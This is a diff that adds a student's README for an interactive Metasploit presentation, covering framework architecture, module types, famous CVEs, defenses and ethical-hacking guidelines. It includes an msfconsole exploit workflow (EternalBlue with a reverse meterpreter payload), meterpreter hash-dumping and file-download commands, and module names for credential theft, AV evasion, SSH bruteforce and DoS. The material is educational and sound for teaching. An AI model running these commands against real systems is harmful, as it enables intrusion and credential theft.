@@ -1,0 +1,915 @@
+🌌 METASPLOIT FRAMEWORK 🌌
+An Interactive Night Sky Presentation
+https://img.shields.io/badge/Metasploit-Penetration%2520Testing-ff5e00?style=flat-square
+https://img.shields.io/badge/Level-Beginner%2520to%2520Intermediate-brightgreen?style=flat-square
+https://img.shields.io/badge/Duration-45%2520Minutes-blue?style=flat-square
+
+Presented by: [iamrodriss]
+Date: [6 march 2026]
+Course: [cybersecurty]
+
+📑 TABLE OF CONTENTS
+Introduction to Metasploit
+
+Presentation Concept
+
+Interactive Features
+
+Metasploit Architecture
+
+Module Types Explained
+
+Famous Exploits & CVEs
+
+Basic msfconsole Commands
+
+Complete List of Modules in Stars
+
+Slide Content (Full Text)
+
+Defense Strategies
+
+Ethical Hacking Guidelines
+
+Study Questions
+
+Additional Resources
+
+Glossary
+
+🌟 INTRODUCTION TO METASPLOIT
+What is Metasploit?
+Metasploit is an open-source penetration testing framework developed by Rapid7. It's essentially a "hacker's toolkit" that contains hundreds of pre-built exploits, payloads, and security tools all in one place.
+
+Why is it Important?
+Reason	Explanation
+Industry Standard	Used by security professionals worldwide
+Automation	Automates complex exploitation techniques
+Research	Helps discover and verify vulnerabilities
+Education	Teaches how attacks work to better defend against them
+Key Statistics
+2147+ Exploits
+
+592+ Payloads
+
+46+ Encoders
+
+11+ NOP generators
+
+Hundreds of auxiliary modules
+
+🎨 PRESENTATION CONCEPT : THE NIGHT SKY
+The Analogy
+text
+┌─────────────────────────────────────────────────────────┐
+│                                                         │
+│   🌟 STARS    =  Metasploit Modules                     │
+│   🪐 CORE     =  Metasploit Framework                   │
+│   ☄️ METEORS  =  Constant Security Activity             │
+│   📦 SLIDES   =  Presentation Content                   │
+│                                                         │
+│   "Vulnerabilities are like stars in the night sky      │
+│    – they're always there, you just need to know        │
+│    where to look and how to reach them."                │
+│                                                         │
+└─────────────────────────────────────────────────────────┘
+Visual Design Philosophy
+The presentation uses:
+
+Pure black background (#000000) for deep space effect
+
+Multi-layered stars with twinkling animations
+
+Purple galaxy nebula for depth
+
+Green terminal text (#00ff00) for hacker aesthetic
+
+Orange core (#ff5e00) representing Metasploit's power
+
+Dynamic meteors with physics-based movement
+
+🎮 INTERACTIVE FEATURES : HOW TO EXPLORE
+🌟 Stars (20 Total)
+How to interact:
+
+HOVER over any star → reveals module name and CVE
+
+CLICK any star → opens terminal with detailed module info
+
+What you'll see when clicking:
+
+bash
+══════════════════════════
+MODULE: exploit/multi/samba/usermap_script
+══════════════════════════
+
+msf6 > use exploit/multi/samba/usermap_script
+msf6 > set RHOSTS 192.168.1.100
+msf6 > exploit
+
+[*] Session opened
+🪐 Core Planet (Center)
+How to interact:
+
+HOVER over core → expands to show Metasploit overview
+
+CLICK core → opens core system terminal
+
+Core information revealed:
+
+text
+◈ METASPLOIT ◈
+The Hacker's Swiss Army Knife
+# msfconsole
+2147 exploits • 592 payloads
+📦 Slide Containers (5 total)
+Locations:
+
+Slide 1: Top-left corner
+
+Slide 2: Top-right corner
+
+Slide 3: Bottom-left corner
+
+Slide 4: Bottom-right corner
+
+Slide 5: Center (floating)
+
+How to interact:
+
+HOVER over any container → expands to full slide
+
+READ the slide content at your own pace
+
+☄️ Meteors
+Just watch and enjoy! They:
+
+Travel in multiple directions
+
+Vary in speed (0.5s - 1.5s)
+
+Vary in length (60px - 140px)
+
+Have realistic glow and head flare
+
+🎯 End Button
+Located at bottom center:
+
+Click → reveals funny ending message
+
+Great way to conclude the presentation
+
+🏗 METASPLOIT ARCHITECTURE DEEP DIVE
+text
+┌─────────────────────────────────────────────────────────┐
+│                    METASPLOIT                            │
+│                       FRAMEWORK                          │
+├─────────────────────────────────────────────────────────┤
+│                                                          │
+│  ┌──────────────┐  ┌──────────────┐  ┌──────────────┐  │
+│  │   EXPLOITS   │  │   PAYLOADS   │  │   ENCODERS   │  │
+│  │   (2147+)    │  │   (592+)     │  │   (46+)      │  │
+│  └──────────────┘  └──────────────┘  └──────────────┘  │
+│                                                          │
+│  ┌──────────────┐  ┌──────────────┐  ┌──────────────┐  │
+│  │  AUXILIARY   │  │     POST     │  │     NOPs     │  │
+│  │   Modules    │  │  Exploitation│  │   (11+)      │  │
+│  └──────────────┘  └──────────────┘  └──────────────┘  │
+│                                                          │
+└─────────────────────────────────────────────────────────┘
+Component Breakdown
+Component	Purpose	Example
+Exploits	Code that takes advantage of vulnerabilities	EternalBlue, Shellshock
+Payloads	Code that runs after successful exploitation	Reverse shell, Meterpreter
+Encoders	Evade antivirus and IDS	Shikata Ga Nai
+Auxiliary	Scanning, fuzzing, DoS	Port scanner, Slowloris
+Post	Post-exploitation activities	Hash dumping, privilege escalation
+NOPs	No-operation instructions for exploit stability	x86 NOP sled
+📚 MODULE TYPES EXPLAINED WITH EXAMPLES
+1. EXPLOITS
+Exploits are the actual code that takes advantage of a vulnerability.
+
+bash
+# Format: exploit/<target>/<vulnerability>
+exploit/windows/smb/ms17_010_eternalblue
+exploit/multi/samba/usermap_script
+exploit/multi/http/struts2_rest_xstream
+exploit/multi/misc/java_rmi_server
+2. PAYLOADS
+Payloads are what runs AFTER a successful exploit.
+
+bash
+# Format: payload/<os>/<type>/<connection>
+payload/windows/shell_reverse_tcp     # Windows reverse shell
+payload/linux/x86/meterpreter/reverse_tcp  # Linux meterpreter
+payload/android/meterpreter/reverse_tcp    # Android meterpreter
+payload/cmd/unix/reverse_netcat            # Unix netcat payload
+Common Payload Types:
+
+shell – Basic command shell
+
+meterpreter – Advanced Metasploit payload with extra features
+
+reverse_tcp – Target connects back to attacker
+
+bind_tcp – Attacker connects to target
+
+3. ENCODERS
+Encoders modify payloads to avoid detection.
+
+bash
+# Format: encoder/<arch>/<technique>
+encoder/x86/shikata_ga_nai    # Polymorphic XOR encoder
+encoder/x86/jmp_call_additive # JMP/CALL technique
+4. AUXILIARY MODULES
+Non-exploit tools for scanning and recon.
+
+bash
+# Format: auxiliary/<category>/<function>
+auxiliary/scanner/portscan/tcp        # TCP port scanner
+auxiliary/dos/http/slowloris           # Slowloris DoS attack
+auxiliary/scanner/ssh/ssh_login        # SSH bruteforce
+auxiliary/scanner/http/dir_scanner     # Web directory scanner
+5. POST MODULES
+Tools that run after gaining access.
+
+bash
+# Format: post/<os>/<function>/<action>
+post/linux/gather/hashdump              # Dump Linux password hashes
+post/windows/gather/credentials/windows_autologin  # Windows autologin creds
+post/multi/manage/shell_to_meterpreter  # Upgrade shell to meterpreter
+🔥 FAMOUS EXPLOITS & CVE REFERENCE
+EternalBlue (MS17-010)
+bash
+Exploit: exploit/windows/smb/ms17_010_eternalblue
+CVE: MS17-010
+Target: Windows SMB
+Impact: WannaCry ransomware (2017)
+Description: Allows remote code execution via SMBv1
+Shellshock
+bash
+Exploit: exploit/multi/bash/shellshock
+CVE: CVE-2014-6271
+Target: Bash vulnerability
+Impact: Remote command execution (2014)
+Description: Bash environment variable injection
+Heartbleed
+bash
+Exploit: auxiliary/scanner/ssl/openssl_heartbleed
+CVE: CVE-2014-0160
+Target: OpenSSL
+Impact: Memory leak of private keys (2014)
+Description: Read server memory due to heartbeat bug
+BlueKeep
+bash
+Exploit: exploit/windows/rdp/cve_2019_0708_bluekeep_rce
+CVE: CVE-2019-0708
+Target: RDP (Remote Desktop Protocol)
+Impact: Wormable RCE (2019)
+Description: Pre-authentication RDP vulnerability
+SambaCry
+bash
+Exploit: exploit/linux/samba/is_known_pipename
+CVE: CVE-2017-7494
+Target: Linux SMB
+Impact: Remote code execution (2017)
+Description: Samba command injection
+⌨️ BASIC msfconsole COMMANDS CHEAT SHEET
+Starting Metasploit
+bash
+┌──(root㉿kali)-[~]
+└─# msfconsole
+
+    =[ metasploit v6.3.25-dev ]
++ -- --=[ 2147 exploits - 592 payloads ]
++ -- --=[ 46 encoders - 11 nops ]
+
+msf6 >
+Essential Commands
+Command	Description	Example
+help	Show help menu	msf6 > help
+search	Search for modules	msf6 > search eternalblue
+use	Select a module	msf6 > use exploit/windows/smb/ms17_010_eternalblue
+show options	Show module options	msf6 > show options
+set	Set a parameter	msf6 > set RHOSTS 192.168.1.100
+setg	Set globally	msf6 > setg RHOSTS 192.168.1.100
+unset	Unset a parameter	msf6 > unset RHOSTS
+check	Check if target is vulnerable	msf6 > check
+exploit	Run the exploit	msf6 > exploit
+run	Run auxiliary module	msf6 > run
+back	Go back to main prompt	msf6 > back
+exit	Exit msfconsole	msf6 > exit
+Typical Exploit Workflow
+bash
+msf6 > search eternalblue
+msf6 > use exploit/windows/smb/ms17_010_eternalblue
+msf6 > show options
+msf6 > set RHOSTS 192.168.1.100
+msf6 > set PAYLOAD windows/x64/meterpreter/reverse_tcp
+msf6 > set LHOST 192.168.1.50
+msf6 > check
+[*] Target is vulnerable
+msf6 > exploit
+
+[*] Started reverse TCP handler
+[*] Sending stage...
+[*] Meterpreter session 1 opened
+meterpreter > 
+Meterpreter Commands (After Exploit)
+bash
+meterpreter > help           # Show meterpreter commands
+meterpreter > sysinfo        # Show target system info
+meterpreter > getuid         # Show current user
+meterpreter > ps             # List running processes
+meterpreter > hashdump       # Dump password hashes
+meterpreter > shell          # Drop to system shell
+meterpreter > download file  # Download file from target
+meterpreter > upload file    # Upload file to target
+meterpreter > exit           # Close session
+⭐ COMPLETE LIST OF MODULES IN THE STARS
+Star 1: Samba Usermap Script
+text
+Module: exploit/multi/samba/usermap_script
+CVE: CVE-2007-2447
+Type: Exploit
+Target: Samba
+Description: Samba "username map script" command execution
+Star 2: Windows Reverse Shell
+text
+Module: payload/windows/shell_reverse_tcp
+CVE: N/A
+Type: Payload
+Target: Windows
+Description: Connect back to attacker and spawn command shell
+Port: 4444 (default)
+Star 3: TCP Port Scanner
+text
+Module: auxiliary/scanner/portscan/tcp
+CVE: N/A
+Type: Auxiliary
+Target: Any
+Description: TCP port scanner - find open ports
+Star 4: Linux Hash Dumper
+text
+Module: post/linux/gather/hashdump
+CVE: N/A
+Type: Post
+Target: Linux
+Description: Dump password hashes from /etc/shadow
+Star 5: EternalBlue
+text
+Module: exploit/windows/smb/ms17_010_eternalblue
+CVE: MS17-010
+Type: Exploit
+Target: Windows SMB
+Description: EternalBlue exploit (used by WannaCry)
+Star 6: Shikata Ga Nai Encoder
+text
+Module: encoder/x86/shikata_ga_nai
+CVE: N/A
+Type: Encoder
+Target: x86 architecture
+Description: Polymorphic XOR encoder for AV evasion
+Star 7: Struts2 RCE
+text
+Module: exploit/multi/http/struts2_rest_xstream
+CVE: CVE-2017-9805
+Type: Exploit
+Target: Apache Struts2
+Description: Struts2 REST plugin XStream RCE
+Star 8: Slowloris DoS
+text
+Module: auxiliary/dos/http/slowloris
+CVE: N/A
+Type: Auxiliary (DoS)
+Target: Apache 1.x/2.x
+Description: Slowloris denial of service attack
+Star 9: Android Meterpreter
+text
+Module: payload/android/meterpreter/reverse_tcp
+CVE: N/A
+Type: Payload
+Target: Android
+Description: Android meterpreter reverse TCP
+Star 10: Web Delivery
+text
+Module: exploit/multi/script/web_delivery
+CVE: N/A
+Type: Exploit
+Target: Multi-platform
+Description: Script-based web delivery (Python/PowerShell)
+Star 11: Windows Autologin Grabber
+text
+Module: post/windows/gather/credentials/windows_autologin
+CVE: N/A
+Type: Post
+Target: Windows
+Description: Grab Windows autologin credentials (plaintext)
+Star 12: Browser Autopwn
+text
+Module: auxiliary/server/browser_autopwn2
+CVE: Multiple
+Type: Auxiliary
+Target: Web browsers
+Description: Drive-by download attack framework
+Star 13: Java RMI Server
+text
+Module: exploit/multi/misc/java_rmi_server
+CVE: CVE-2011-3556
+Type: Exploit
+Target: Java RMI
+Description: Java RMI server exploit
+Star 14: Linux Meterpreter
+text
+Module: payload/linux/x86/meterpreter/reverse_tcp
+CVE: N/A
+Type: Payload
+Target: Linux x86
+Description: Linux meterpreter reverse TCP
+Star 15: SSH Login Scanner
+text
+Module: auxiliary/scanner/ssh/ssh_login
+CVE: N/A
+Type: Auxiliary
+Target: SSH servers
+Description: SSH bruteforce login scanner
+Star 16: Shell to Meterpreter
+text
+Module: post/multi/manage/shell_to_meterpreter
+CVE: N/A
+Type: Post
+Target: Multi-platform
+Description: Upgrade a command shell to meterpreter
+Star 17: Kitrap0d Local Privilege Escalation
+text
+Module: exploit/windows/local/ms10_015_kitrap0d
+CVE: MS10-015
+Type: Exploit (Local)
+Target: Windows
+Description: Windows local privilege escalation
+Star 18: Directory Scanner
+text
+Module: auxiliary/scanner/http/dir_scanner
+CVE: N/A
+Type: Auxiliary
+Target: Web servers
+Description: Scan for web directories
+Star 19: Unix Reverse Netcat
+text
+Module: payload/cmd/unix/reverse_netcat
+CVE: N/A
+Type: Payload
+Target: Unix/Linux
+Description: Netcat-based reverse shell
+Star 20: Tomcat Manager Upload
+text
+Module: exploit/multi/http/tomcat_mgr_upload
+CVE: Multiple
+Type: Exploit
+Target: Apache Tomcat
+Description: Tomcat manager application upload/deploy
+📄 SLIDE CONTENT (FULL TRANSCRIPT)
+SLIDE 1: INTRODUCTION
+text
+╔══════════════════════╗
+║    WHAT IS METASPLOIT║
+╚══════════════════════╝
+
+• Penetration testing framework
+• 2000+ exploits
+• 500+ payloads
+• Developed by Rapid7
+• Open source framework
+
+[*] Used by:
+    - Security professionals
+    - Ethical hackers
+    - Penetration testers
+
+Key Features:
+- Automated exploitation
+- Vulnerability verification
+- Security research
+- Defense testing
+SLIDE 2: ARCHITECTURE
+text
+╔══════════════════════╗
+║    MSF COMPONENTS    ║
+╚══════════════════════╝
+
+██ Exploits
+   └─ Code that breaks in
+   └─ Targets specific vulnerabilities
+
+██ Payloads
+   └─ What runs after exploit
+   └─ Shell, Meterpreter, etc.
+
+██ Encoders
+   └─ AV evasion
+   └─ Polymorphic code
+
+██ Auxiliary
+   └─ Scanners, fuzzers
+   └─ DoS, recon tools
+
+██ Post
+   └─ Post-exploitation
+   └─ Hash dumping, persistence
+SLIDE 3: BASIC COMMANDS
+text
+╔══════════════════════╗
+║    msfconsole       ║
+╚══════════════════════╝
+
+msf > search exploit
+msf > use exploit/...
+msf > show options
+msf > set RHOSTS x.x.x.x
+msf > set PAYLOAD ...
+msf > check
+msf > exploit
+
+[*] Session opened!
+
+Meterpreter Commands:
+meterpreter > sysinfo
+meterpreter > getuid
+meterpreter > hashdump
+meterpreter > shell
+SLIDE 4: FAMOUS EXPLOITS
+text
+╔══════════════════════╗
+║    HISTORICAL       ║
+╚══════════════════════╝
+
+🔴 EternalBlue (MS17-010)
+   └─ WannaCry ransomware (2017)
+   └─ 200,000+ computers affected
+   └─ Windows SMB vulnerability
+
+🔴 Shellshock (CVE-2014-6271)
+   └─ Bash vulnerability
+   └─ Remote command execution
+   └─ Affected Unix/Linux systems
+
+🔴 Heartbleed (CVE-2014-0160)
+   └─ OpenSSL memory leak
+   └─ Exposed private keys
+   └─ 500,000+ servers vulnerable
+
+🔴 BlueKeep (CVE-2019-0708)
+   └─ RDP RCE
+   └─ Wormable vulnerability
+   └─ Windows 7/2008 affected
+
+🔴 SambaCry (CVE-2017-7494)
+   └─ Linux SMB
+   └─ Remote code execution
+   └─ Similar to EternalBlue
+SLIDE 5: DEFENSE
+text
+╔══════════════════════╗
+║    PROTECTION       ║
+╚══════════════════════╝
+
+🛡️ Keep systems updated
+   └─ Regular patch management
+   └─ Automatic updates
+
+🛡️ Network segmentation
+   └─ Separate networks
+   └─ DMZ for public services
+
+🛡️ IDS/IPS (Snort, Suricata)
+   └─ Detect exploit attempts
+   └─ Block malicious traffic
+
+🛡️ Least privilege
+   └─ Minimal user rights
+   └─ Application whitelisting
+
+🛡️ Regular audits
+   └─ Vulnerability scanning
+   └─ Penetration testing
+
+🛡️ Security training
+   └─ Phishing awareness
+   └─ Secure coding practices
+
+[!] "Know yourself, know your enemy"
+    - Sun Tzu, The Art of War
+🛡️ DEFENSE STRATEGIES AGAINST ATTACKS
+1. PATCH MANAGEMENT
+Action	Why
+Enable automatic updates	Most exploits target known vulnerabilities
+Test patches before deployment	Ensure stability
+Maintain inventory of all systems	Know what needs patching
+Subscribe to security advisories	Stay informed
+2. NETWORK SECURITY
+text
+Internet ──► Firewall ──► DMZ ──► Internal Network
+                │           │           │
+                ▼           ▼           ▼
+              Rules     Web/Mail    Workstations
+                        Servers
+Best Practices:
+
+Segment networks by function
+
+Use firewalls between segments
+
+Monitor north-south AND east-west traffic
+
+Implement 802.1X for network access control
+
+3. ENDPOINT PROTECTION
+Antivirus/Antimalware: Detect known threats
+
+EDR (Endpoint Detection & Response): Behavioral analysis
+
+Application Control: Whitelist approved apps
+
+Device Control: Restrict USB and peripherals
+
+4. ACCESS CONTROL
+text
+┌─────────────────┐
+│  Authentication │  (Who you are)
+├─────────────────┤
+│  Authorization  │  (What you can do)
+├─────────────────┤
+│  Accounting     │  (What you did)
+└─────────────────┘
+Implementation:
+
+Multi-factor authentication (MFA)
+
+Role-based access control (RBAC)
+
+Principle of least privilege
+
+Regular access reviews
+
+5. MONITORING & DETECTION
+Tool	Purpose
+SIEM	Log aggregation and correlation
+IDS/IPS	Network threat detection
+HIDS	Host-based intrusion detection
+File Integrity Monitoring	Detect unauthorized changes
+6. INCIDENT RESPONSE
+Preparation – Have a plan ready
+
+Identification – Detect the incident
+
+Containment – Stop the spread
+
+Eradication – Remove the threat
+
+Recovery – Restore operations
+
+Lessons Learned – Improve for next time
+
+⚖️ ETHICAL HACKING GUIDELINES
+The Hacker Ethos
+text
+┌─────────────────────────────────────────────────┐
+│                                                 │
+│   "With great power comes great responsibility" │
+│                    – Uncle Ben                  │
+│                                                 │
+└─────────────────────────────────────────────────┘
+DO's and DON'Ts
+✅ DO	❌ DON'T
+Test only systems you own	Hack without permission
+Get written authorization	Access data you shouldn't see
+Follow scope of engagement	Exceed testing boundaries
+Report vulnerabilities responsibly	Publicly disclose without coordination
+Use for education and defense	Use for personal gain
+Stay within legal boundaries	Break the law
+Legal Framework
+In most countries, unauthorized access is a crime:
+
+USA: Computer Fraud and Abuse Act (CFAA)
+
+UK: Computer Misuse Act
+
+EU: General Data Protection Regulation (GDPR)
+
+Penalties: Fines and imprisonment
+
+Responsible Disclosure Process
+text
+1. Discover vulnerability
+2. Verify it's real
+3. Contact vendor privately
+4. Allow time to fix (usually 90 days)
+5. Coordinate public disclosure
+6. Publish with vendor's fix
+Certifications for Ethical Hackers
+CEH (Certified Ethical Hacker)
+
+OSCP (Offensive Security Certified Professional)
+
+GPEN (GIAC Penetration Tester)
+
+CISSP (Certified Information Systems Security Professional)
+
+❓ STUDY QUESTIONS FOR SELF-REVIEW
+Basic Concepts
+What is Metasploit and who developed it?
+
+Name the five main components of Metasploit architecture.
+
+What's the difference between an exploit and a payload?
+
+What is an encoder used for?
+
+Give three examples of auxiliary modules.
+
+Commands
+Write the command to search for EternalBlue exploits.
+
+How do you set the target IP address in Metasploit?
+
+What command checks if a target is vulnerable?
+
+How do you run an exploit once configured?
+
+What's the difference between set and setg?
+
+Modules
+What CVE is associated with EternalBlue?
+
+Which module would you use to dump Linux password hashes?
+
+What is Shikata Ga Nai and what does it do?
+
+Name a module for Android hacking.
+
+Which module performs SSH bruteforce attacks?
+
+Defense
+List three ways to protect against Metasploit attacks.
+
+Why is patch management important?
+
+What is the principle of least privilege?
+
+Name two IDS/IPS tools.
+
+What is responsible disclosure?
+
+Scenario Questions
+You've gained a shell on a Windows machine. What meterpreter command shows current user?
+
+A client asks you to test their web application. What's your first step?
+
+You discover a critical vulnerability. What's the proper disclosure process?
+
+Your exploit keeps getting caught by antivirus. What module could help?
+
+You need to scan for open ports on a target network. Which module do you use?
+
+📚 ADDITIONAL RESOURCES
+Official Documentation
+Metasploit Unleashed – Free course
+
+Rapid7 Metasploit Docs
+
+Metasploit GitHub
+
+Practice Platforms
+text
+┌─────────────────────────────────────┐
+│  TryHackMe     – Metasploit rooms   │
+│  HackTheBox    – Real-world boxes   │
+│  VulnHub       – Vulnerable VMs     │
+│  PentesterLab  – Web app testing    │
+│  OverTheWire   – Wargames            │
+└─────────────────────────────────────┘
+Vulnerability Databases
+CVE Details
+
+Exploit-DB
+
+NVD (NIST)
+
+VulDB
+
+Books
+Title	Author	Focus
+Metasploit: The Penetration Tester's Guide	David Kennedy	Comprehensive guide
+The Hacker Playbook	Peter Kim	Practical penetration testing
+Penetration Testing	Georgia Weidman	Hands-on introduction
+Web Application Hacker's Handbook	Stuttard & Pinto	Web app focus
+YouTube Channels
+IppSec – HackTheBox walkthroughs
+
+STÖK – Bug bounty hunting
+
+The Cyber Mentor – Beginner tutorials
+
+HackerSploit – Security tutorials
+
+Communities
+Reddit: r/netsec, r/AskNetsec, r/hacking
+
+Discord: InfoSec communities
+
+Twitter: Follow @metasploit, @rapid7
+
+Local: OWASP chapters, BSides events
+
+📖 GLOSSARY OF TERMS
+Term	Definition
+Exploit	Code that takes advantage of a vulnerability
+Payload	Code that runs after successful exploitation
+Meterpreter	Advanced Metasploit payload with extended features
+CVE	Common Vulnerabilities and Exposures (standard ID)
+0-day	Vulnerability unknown to vendor/no patch available
+RCE	Remote Code Execution
+DoS	Denial of Service
+DDoS	Distributed Denial of Service
+Privilege Escalation	Gaining higher-level access
+Post-exploitation	Activities after gaining access
+AV Evasion	Avoiding antivirus detection
+Shell	Command-line access to system
+Bind Shell	Shell listening on target port
+Reverse Shell	Target connects back to attacker
+NOP Sled	Series of no-operation instructions
+Buffer Overflow	Writing beyond buffer boundaries
+Social Engineering	Manipulating people, not systems
+Phishing	Fraudulent emails to steal credentials
+Penetration Testing	Authorized simulated attacks
+Ethical Hacker	Hacker who works with permission
+White Hat	Ethical hacker
+Black Hat	Malicious hacker
+Grey Hat	Somewhere in between
+Script Kiddie	Inexperienced hacker using tools
+Hacktivist	Hacking for political/social causes
+🎉 FUNNY ENDING MESSAGE
+When you click the button at the bottom of the presentation, you'll see:
+
+text
+╔══════════════════════════════════════╗
+║         PRESENTATION COMPLETE        ║
+╚══════════════════════════════════════╝
+
+    ███████╗███╗   ██╗██████╗ 
+    ██╔════╝████╗  ██║██╔══██╗
+    █████╗  ██╔██╗ ██║██║  ██║
+    ██╔══╝  ██║╚██╗██║██║  ██║
+    ███████╗██║ ╚████║██████╔╝
+    ╚══════╝╚═╝  ╚═══╝╚═════╝ 
+
+> "Now you think you can hack anything with Metasploit?" <
+
+┌──(root㉿kali)-[~]
+└─# msfconsole
+msf6 > use exploit/windows/smb/ms17_010_eternalblue
+msf6 > set RHOSTS 192.168.1.100
+msf6 > exploit
+
+[-] Exploit failed: You need to study more! 😜
+
+[ JUST KIDDING! Thanks for watching! ]
+📝 PERSONAL NOTES SECTION
+Use this space for your own notes:
+
+text
+_________________________________________________
+_________________________________________________
+_________________________________________________
+_________________________________________________
+_________________________________________________
+_________________________________________________
+_________________________________________________
+_________________________________________________
+_________________________________________________
+_________________________________________________
+📞 CONTACT INFORMATION
+Presenter: [Your Name]
+Email: [Your Email]
+Course: [Your Course]
+Institution: [Your School/University]
+
+Questions? Feel free to reach out!
+
+⭐ FEEDBACK
+I'd love to hear your thoughts on this presentation!
+
+What did you find most useful?
+
+What could be improved?
+
+Any topics you'd like covered in future sessions?
+
+<div align="center">
+🌟 THANK YOU FOR EXPLORING THE NIGHT SKY! 🌟
+Remember: In cybersecurity, we're all students forever.
+
+Happy (ethical) hacking! 🚀
+
+This document is for educational purposes only.
+Always obtain proper authorization before testing any system.
